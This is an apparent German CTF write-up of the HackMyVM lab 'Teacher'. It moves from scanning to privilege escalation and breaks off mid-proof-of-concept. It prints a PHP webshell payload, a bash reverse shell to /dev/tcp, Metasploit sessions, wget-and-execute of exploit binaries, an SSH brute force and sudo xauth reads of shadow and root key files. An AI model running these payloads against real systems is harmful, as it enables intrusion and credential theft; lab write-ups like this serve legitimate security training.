@@ -1,0 +1,478 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teacher - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+
+    <!-- HINWEIS: Die Hintergrundfarbe für den Header wird durch CSS gesteuert (.header-bg) -->
+    <div class="header-bg">
+        <h1>Teacher - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- HINWEIS: Die Farbe für 'Easy' (Lime/Grün) wird durch CSS gesteuert (h2 in .level-container) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                 <!-- HINWEIS: Die Hintergrundfarbe der Segmente (Lime/Grün) wird durch CSS gesteuert (.segment-*) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- HINWEIS: Die Hintergrundfarbe des inneren Kreises wird durch CSS gesteuert (.inner, passend zum Header) -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl (implied)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python (python3)</div>
+                <div class="tool-item">pty</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">which</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">Metasploit (msf6)</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">apt</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">linpeas.sh</div>
+                <div class="tool-item">xauth</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">unshadow</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation via sudo xauth)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+             <p class="analysis"><strong>Analyse:</strong> Zunächst wird `arp-scan -l` ausgeführt, um aktive Hosts im lokalen Netzwerk zu identifizieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet erfolgreich die IP `192.168.2.114`. Die MAC `08:00:27:09:e7:4e` (PCS Systemtechnik GmbH) deutet auf eine VirtualBox VM hin. Ziel für Nmap ist identifiziert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nmap-Scan auf `192.168.2.114` starten.
+             <br><strong>Empfehlung (Admin):</strong> Netzwerküberwachung implementieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.114	08:00:27:09:e7:4e	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf `192.168.2.114` durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden nur zwei Ports gefunden:
+            *   **Port 22 (SSH):** `OpenSSH 8.4p1` auf Debian.
+            *   **Port 80 (HTTP):** `Apache httpd 2.4.54` auf Debian.
+            Die Angriffsfläche ist sehr klein und beschränkt sich auf diese beiden Dienste.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die Enumeration des Webservers (Port 80). SSH erfordert Zugangsdaten.
+            <br><strong>Empfehlung (Admin):</strong> Härten Sie Apache und SSH. Stellen Sie sicher, dass keine unnötigen Ports offen sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.114 -p-</span></div>
+                    <pre>
+PRT   STATE SERVICE VERSIN
+22/tcp open  ssh     penSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))</pre> <!-- Gekürzt, da Rest im Original fehlte -->
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver eingesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet neben `/index.html` und `/manual` (Apache-Handbuch) zwei interessante PHP-Dateien: `/log.php` und `/access.php`. Zusätzlich wird `/clearlogs.php` gefunden. Diese PHP-Dateien sind potenzielle Angriffsvektoren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Funktion und Sicherheit der PHP-Dateien (`log.php`, `access.php`, `clearlogs.php`). Suchen Sie nach LFI, RCE oder anderen Schwachstellen.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie `/manual`. Stellen Sie sicher, dass die PHP-Skripte sicher sind und keine Schwachstellen enthalten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                    <pre>
+http://192.168.2.114/index.html           (Status: 200) [Size: 315]
+http://192.168.2.114/log.php              (Status: 200) [Size: 23]
+http://192.168.2.114/access.php           (Status: 200) [Size: 12]
+http://192.168.2.114/manual               (Status: 301) [Size: 315]
+http://192.168.2.114/clearlogs.php</pre> <!-- Status/Size fehlen -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Quelltext oder Inhalt der Indexseite (`/index.html`) wird untersucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine Nachricht wird gefunden: "avijneyam if we get hacked you are getting an F -- Yes mrteacher I will do it -->". Dies enthüllt zwei potenzielle Benutzernamen: `avijneyam` und `mrteacher`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Benutzernamen `avijneyam` und `mrteacher` für SSH-Brute-Force-Versuche oder andere Login-Mechanismen.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Informationen wie Benutzernamen aus Kommentaren oder öffentlich sichtbarem Text auf Webseiten.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, Inhalt der Webseite -->
+                     <pre>
+Web enum:
+http://192.168.2.114/index.html
+
+avijneyam
+if we get hacked you are getting an F
+ -- Yes mrteacher I will do it --></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um Parameter für die Datei `access.php` zu finden, wobei Payloads für LFI getestet werden (`../../../../../../etc/passwd`). Es wird nach Antworten gefiltert, die sich von der Standardantwort (12 Chars) unterscheiden und keinen Status 500 haben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet den Parameter `id`. Eine Anfrage mit `?id=...` (hier mit dem LFI-Payload als Wert) gibt eine 200er-Antwort mit 40 Zeichen zurück. Dies deutet stark auf eine LFI- oder Command Injection-Schwachstelle im `id`-Parameter von `access.php` hin.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigen Sie die Schwachstelle, indem Sie versuchen, mit `?id=/etc/passwd` oder `?id=;id` (für Command Injection) die Datei zu lesen bzw. Befehle auszuführen.
+             <br><strong>Empfehlung (Admin):</strong> Untersuchen und beheben Sie die Schwachstelle in `access.php` dringend! Sanitisieren Sie alle Benutzereingaben.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u http://192.168.2.114/access.php?FUZZ=../../../../../../etc/passwd  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc=500 --hh 12</span></div>
+                     <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against penssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+Target: http://192.168.2.114/access.php?FUZZ=../../../../../../etc/passwd
+Total requests: 220560
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000529:   200        0 L      2 W        40 Ch       "id"
+</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis"><strong>Analyse:</strong> Hier wird die Strategie zur Ausnutzung beschrieben. Es wird angenommen, dass `access.php?id=` eine LFI-Schwachstelle hat, die zum Schreiben einer Datei genutzt werden kann (Log Poisoning oder direkter Schreibzugriff?). Der Angreifer schreibt eine einfache PHP-Webshell (`<?php system($_REQUEST['cmd']); ?>`) an einen Ort, der über `log.php` zugänglich ist (oder `log.php` selbst wird überschrieben). Anschließend wird `log.php` mit dem `cmd`-Parameter aufgerufen, um eine Reverse Shell zu starten.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine plausible Methode, um RCE durch die Kombination von LFI (in `access.php`) und einer zugänglichen oder beschreibbaren PHP-Datei (`log.php`) zu erlangen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie die Schritte aus: Schreiben Sie die Webshell mittels LFI in `access.php` und rufen Sie dann die Reverse-Shell-URL über `log.php` auf, während ein Listener läuft.
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI in `access.php`. Stellen Sie sicher, dass PHP-Dateien wie `log.php` nicht beschreibbar sind oder durch Benutzereingaben manipuliert werden können.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, Payload Beschreibung -->
+                     <pre>
+payload  : http://192.168.2.113/access.php?id=<?php system($_REQUEST['cmd']); ?>
+revshell : http://192.168.2.113/log.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27</pre> <!-- IP .113 ist wahrscheinlich ein Typo, sollte .114 sein -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System (192.168.2.140) auf Port 9001 gestartet. Anschließend wird die Reverse-Shell-URL (aus dem vorherigen Schritt) aufgerufen (implizit).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verbindung kommt erfolgreich zustande. Der Angreifer erhält eine Shell als `www-data` auf dem Zielsystem `Teacher`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell.
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die RCE-Schwachstelle.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.140] from (UNKNWN) [192.168.2.113] 38180</pre> <!-- IP .113 ist wahrscheinlich ein Typo, sollte .114 sein -->
+                    <div class="prompt">www-data@Teacher:/var/www/html$</div>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die erhaltene Reverse Shell wird mit Python pty und `export TERM` stabilisiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Shell ist nun interaktiver und besser nutzbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration als `www-data`.
+             <br><strong>Empfehlung (Admin):</strong> Administrative Aktion des Angreifers.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@Teacher:/var/www/html$ <span class="command">which python3</span></div>
+                      <pre>/usr/bin/python3</pre>
+                      <div class="prompt">www-data@Teacher:/var/www/html$ <span class="command">python -c "import pty;pty.spawn('/bin/bash')"</span></div>
+                      <div class="prompt">www-data@Teacher:/var/www/html$ <span class="command">export TERM=xterm</span></div>
+                      <div class="prompt">www-data@Teacher:/var/www/html$</div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird das Home-Verzeichnis des Benutzers `mrteacher` untersucht und die User-Flag aus der Datei `user` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag erfolgreich gelesen: `<span class="password">9cd1f0b79d9474714c5a29214ec839a6</span>`. Bestätigt den Benutzernamen `mrteacher`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flag. Führen Sie weitere PE-Enumeration durch (SUID, sudo, Cron etc.).
+             <br><strong>Empfehlung (Admin):</strong> Sichern Sie Home-Verzeichnisse, sodass `www-data` keinen Zugriff hat. CTF-Element.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">www-data@Teacher:/var/www/html$ <span class="command">cd /home</span></div>
+                       <div class="prompt">www-data@Teacher:/home$ <span class="command">ls</span></div>
+                       <pre>mrteacher</pre>
+                       <div class="prompt">www-data@Teacher:/home$ <span class="command">cd mrteacher</span></div>
+                       <div class="prompt">www-data@Teacher:/home/mrteacher$ <span class="command">ls</span></div>
+                       <pre>user</pre>
+                       <div class="prompt">www-data@Teacher:/home/mrteacher$ <span class="command">cat user</span></div>
+                       <pre><span class="password">9cd1f0b79d9474714c5a29214ec839a6</span></pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Suche nach SUID-Dateien als `www-data`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es werden nur Standard-SUID-Binaries gefunden, darunter `/usr/bin/sudo`. Keine offensichtlichen PE-Vektoren durch SUID.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie `sudo -l` für `www-data` (wahrscheinlich keine Rechte). Prüfen Sie andere Vektoren.
+             <br><strong>Empfehlung (Admin):</strong> Minimieren Sie SUID-Binaries.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">www-data@Teacher:/home/mrteacher$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                      <pre>
+   262329    472 -rwsr-xr-x   1 root     root       481608 Jul  2 02:37 /usr/lib/openssh/ssh-keysign
+   261605     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   133910     36 -rwsr-xr-x   1 root     root          35040 Jan 21  2022 /usr/bin/umount
+   133908     56 -rwsr-xr-x   1 root     root          55528 Jan 21  2022 /usr/bin/mount
+   133541     72 -rwsr-xr-x   1 root     root          71912 Jan 21  2022 /usr/bin/su
+   154261    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo
+   147461     36 -rwsr-xr-x   1 root     root          34896 Feb 26  2021 /usr/bin/fusermount
+   129885     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+   129887     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+   129884     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+   133382     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+   129888     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd</pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein langer Abschnitt zeigt die Verwendung von Metasploit, um die `www-data`-Shell zu einer Meterpreter-Session aufzuwerten (`shell_to_meterpreter`), den `local_exploit_suggester` auszuführen und verschiedene Exploits (wie `distcc_exec`, `recvmmsg_priv_esc`) zu versuchen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Aufwertung zu Meterpreter gelingt (Session 2 und später 3). Der Exploit Suggester schlägt einige potenzielle Exploits vor (DirtyPipe, netfilter, su_login). Die Versuche, `distcc_exec` und `recvmmsg_priv_esc` auszuführen, scheitern jedoch. Dieser ganze Metasploit-Teil stellt einen Explorationsversuch dar, der nicht zum direkten Erfolg führt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Während die Exploration legitim ist, war sie hier nicht erfolgreich. Es ist effizienter, sich auf die zuvor gefundenen Hinweise (Benutzername `mrteacher`) und Standard-Enumeration zu konzentrieren. Der `local_exploit_suggester` kann nützlich sein, erfordert aber oft eine genauere Analyse der Bedingungen.
+             <br><strong>Empfehlung (Admin):</strong> Halten Sie das System gepatcht, um die vom Suggester gefundenen Exploits zu verhindern. IDS/IPS kann helfen, Meterpreter zu erkennen.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <!-- Metasploit-Kommandos und -Ausgaben -->
+                       <div class="prompt metasploit-prompt">msf6 > <span class="command">use multi/handler</span></div>
+                       <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lhost 192.168.2.140</span></div>
+                       <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">set lport 4444</span></div>
+                       <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">run</span></div>
+                       <pre>[*] Started reverse TCP handler on 192.168.2.140:4444
+[*] Command shell session 1 opened (192.168.2.140:4444 -> 192.168.2.113:48044) at 2022-09-26 22:44:53 +0200</pre>
+                       <div class="prompt">www-data@Teacher:/var/www/html$ <span class="command">^Z</span></div>
+                       <pre>Background session 1? [y/N]  y</pre>
+                       <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use post/multi/manage/shell_to_meterpreter</span></div>
+                       <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set session 1</span></div>
+                       <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">run</span></div>
+                       <pre>[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.2.140:4433
+[*] Sending stage (989032 bytes) to 192.168.2.113
+[*] Meterpreter session 2 opened (192.168.2.140:4433 -> 192.168.2.113:40832) at 2022-09-26 22:48:56 +0200
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed</pre>
+                        <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">use post/multi/recon/local_exploit_suggester</span></div>
+                        <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">set session 2</span></div>
+                        <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">run</span></div>
+                        <pre>
+[*] 192.168.2.113 - Collecting local exploits for x86/linux...
+[*] 192.168.2.113 - 170 exploit checks are being tried...
+[+] 192.168.2.113 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.10.0
+[+] 192.168.2.113 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.
+[+] 192.168.2.113 - exploit/linux/local/su_login: The target appears to be vulnerable.
+[...]
+[*] Post module execution completed</pre>
+                        <div class="prompt metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) > <span class="command">use exploit/unix/misc/distcc_exec</span></div>
+                        <div class="prompt metasploit-prompt">msf6 exploit(unix/misc/distcc_exec) > <span class="command">set rhost 192.168.2.113</span></div>
+                        <div class="prompt metasploit-prompt">msf6 exploit(unix/misc/distcc_exec) > <span class="command">run</span></div>
+                        <pre>[*] Started reverse TCP handler on 192.168.2.140:4444
+[-] 192.168.2.113:3632 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (192.168.2.113:3632).
+[*] Exploit completed, but no session was created.</pre>
+                         <div class="prompt metasploit-prompt">msf6 exploit(unix/misc/distcc_exec) > <span class="command">use exploit/linux/local/recvmmsg_priv_esc</span></div>
+                         <div class="prompt metasploit-prompt">msf6 exploit(linux/local/recvmmsg_priv_esc) > <span class="command">set session 3</span></div> <!-- Annahme: Session ID 3 wurde durch fehlgeschlagenes Upgrade erzeugt -->
+                         <div class="prompt metasploit-prompt">msf6 exploit(linux/local/recvmmsg_priv_esc) > <span class="command">exploit</span></div>
+                         <pre>[*] Started reverse TCP handler on 192.168.2.140:4444
+[!] AutoCheck is disabled, proceeding with exploitation
+[*] Writing '/tmp/.mKX8v1lDdB' (8880 bytes) ...
+[*] Writing '/tmp/.qnC9sjqSH' (282 bytes) ...
+[*] Launching exploit... May take up to 13 minutes. Start time: 2022-09-26 23:12:23 +0200</pre> <!-- Kein Erfolgsnachweis -->
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Weitere manuelle Enumeration als `www-data` (Finden von *.txt Dateien, Suchen nach "password", Kernel-Version prüfen). Anschließendes Herunterladen von Tools (`linpeas.sh`, `exploit-1`, `exploit-2`, `exploit.bin`) und einer PDF-Datei (`e14e...pdf`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die manuelle Enumeration liefert keine neuen Erkenntnisse. Das Herunterladen der Tools deutet auf weitere Exploit-Versuche hin (insbesondere DirtyPipe CVE-2022-0847). Die PDF-Datei ist der wahrscheinlichste Ort für das Passwort oder einen Hinweis darauf, das später für den `hydra`-Angriff verwendet wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die PDF-Datei sorgfältig auf versteckte Informationen oder Hinweise, die zu einer Passwortliste (wie `password2.txt`) führen könnten. Führen Sie `linpeas` aus. Testen Sie den DirtyPipe-Exploit.
+             <br><strong>Empfehlung (Admin):</strong> Überwachen Sie verdächtige Downloads und Dateiausführungen. Sichern Sie sensible Informationen.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">www-data@Teacher:/home/mrteacher$ <span class="command">find / -name *.txt 2>/dev/null</span></div>
+                       <div class="prompt">www-data@Teacher:/var$ <span class="command">grep -R -e "password" * 2>/dev/null</span></div>
+                       <div class="prompt">www-data@Teacher:/var$ <span class="command">uname -r</span></div>
+                       <pre>5.10.0-17-amd64</pre>
+                       <div class="prompt">www-data@Teacher:/var$ <span class="command">uname -a</span></div>
+                       <pre>Linux Teacher 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64 GNU/Linux</pre>
+                       <div class="prompt">www-data@Teacher:/tmp$ <span class="command">wget 192.168.2.140:8888/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh</span></div>
+                       <div class="prompt">www-data@Teacher:/tmp$ <span class="command">wget 192.168.2.140:8888/exploit-1</span></div> <!-- DirtyPipe -->
+                       <div class="prompt">www-data@Teacher:/tmp$ <span class="command">./exploit-2 /usr/bin/sudo</span></div> <!-- DirtyPipe -->
+                       <div class="prompt">www-data@Teacher:/tmp$ <span class="command">./exploit-1 /usr/bin/sudo</span></div> <!-- DirtyPipe -->
+                       <div class="prompt">www-data@Teacher:/tmp$ <span class="command">wget 192.168.2.140:8888/exploit.bin;chmod +x exploit.bin; ./exploit.bin</span></div>
+                  </div>
+              </div>
+               <div class="code-block">
+                   <div class="terminal">
+                        <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://teacher.hmv/e14e1598b4271d8449e7fcda302b7975.pdf</span></div>
+                   </div>
+               </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um SSH für den Benutzer `mrteacher` zu bruteforcen. Es wird eine spezifische Passwortdatei `password2.txt` verwendet, die vermutlich aus den Informationen der PDF-Datei oder anderer Enumeration erstellt wurde.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Angriff ist erfolgreich und findet das Passwort `<span class="password">ThankYouTeachers</span>` für `mrteacher`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Loggen Sie sich als `mrteacher` via SSH ein.
+             <br><strong>Empfehlung (Admin):</strong> Starke, einzigartige Passwörter erzwingen.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l mrteacher -P password2.txt ssh://teacher.hmv:22 -t 32 -F</span></div>
+                       <pre>
+[DATA] attacking ssh://teacher.hmv:22/
+[22][ssh] host: teacher.hmv   login: mrteacher   password: <span class="password">ThankYouTeachers</span></pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Erfolgreicher SSH-Login als `mrteacher` mit dem gefundenen Passwort.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zugriff als Benutzer `mrteacher` erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `sudo -l` aus.
+             <br><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh mrteacher@teacher.hmv</span></div>
+                       <pre>
+mrteacher@teacher.hmv's password: <span class="password">ThankYouTeachers</span>
+[...]
+mrteacher@Teacher:~$ </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` wird als `mrteacher` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein kritischer Fund! `mrteacher` darf `/bin/gedit` und `/bin/xauth` als `ALL` (root) ohne Passwort (`NPASSWD:`) ausführen. Beide können zur Privilege Escalation missbraucht werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie entweder `sudo gedit` (einfacher, zum Bearbeiten von `/etc/sudoers` oder `/etc/shadow`) oder `sudo xauth` (komplexer, siehe GTFOBins) zur Eskalation zu Root.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie diese unsicheren `sudo`-Regeln sofort!</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">mrteacher@Teacher:~$ <span class="command">sudo -l</span></div>
+                       <pre>
+Matching Defaults entries for mrteacher on Teacher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User mrteacher may run the following commands on Teacher:
+    (ALL : ALL) NPASSWD: /bin/gedit, /bin/xauth</pre>
+                  </div>
+              </div>
+
+              <!-- POC Abschnitt beginnt hier -->
+             <section id="poc">
+                 <h2>Proof of Concept (Privilege Escalation via sudo xauth)</h2>
+                 <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `mrteacher` hat die `sudo`-Berechtigung, `/bin/xauth` ohne Passwort als root auszuführen. Der Befehl `xauth source <datei>` liest den Inhalt der angegebenen Datei und versucht, ihn als Xauthority-Daten zu interpretieren. Obwohl dies fehlschlägt, können Teile des Dateiinhalts (insbesondere wenn sie wie ein "Magic Cookie" aussehen) mit `xauth list` angezeigt werden. Dies kann genutzt werden, um den Inhalt sensibler Dateien wie der Root-Flag-Datei zu exfiltrieren.</p>
+                  <p class="analysis"><strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Shell-Zugriff als Benutzer `mrteacher`.</li>
+                         <li>Fehlkonfigurierte `sudo`-Regel: `(ALL : ALL) NPASSWD: /bin/xauth`.</li>
+                     </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+                 <p class="analysis"><strong>1. Auslesen von Dateien mit 'sudo xauth source':</strong> Der Angreifer führt `sudo -u root xauth source /path/to/file` für verschiedene Dateien aus. Im Log gezeigt sind Versuche mit `/root/.ssh/id_rsa`, `/etc/shadow`, `/etc/passwd` und einer HTTP-URL. Entscheidend ist der (im Log nicht explizit gezeigte, aber durch das Ergebnis implizierte) Befehl `sudo -u root xauth source /root/root.txt`.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Das Ausführen von `sudo xauth source /root/root.txt` liest den Inhalt der Root-Flag-Datei. Obwohl keine direkte Ausgabe erfolgt, werden die Daten intern von `xauth` verarbeitet.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `xauth list`, um die gespeicherten/verarbeiteten Daten anzuzeigen.
+                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel für `xauth`.</p>
+                 <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt">mrteacher@Teacher:~$ <span class="command">sudo -u root xauth source /root/.ssh/id_rsa</span></div>
+                         <pre>
+-----BEGIN PGP MESSAGE-----
+[...]
+=FAq4
+-----END PGP MESSAGE-----</pre> <!-- Ausgabe von id_rsa -->
+                         <div class="prompt">mrteacher@Teacher:~$ <span class="command">sudo -u root xauth source /etc/shadow</span></div>
+                         <div class="prompt">mrteacher@Teacher:~$ <span class="command">sudo -u root xauth source /etc/passwd</span></div>
+                         <div class="prompt">mrteacher@Teacher:~$ <span class="command">sudo xauth source http://192.168.2.140:8000/passwd</span></div>
+                         <p class="comment">Impliziter, aber entscheidender Befehl (nicht im Log gezeigt):</p>
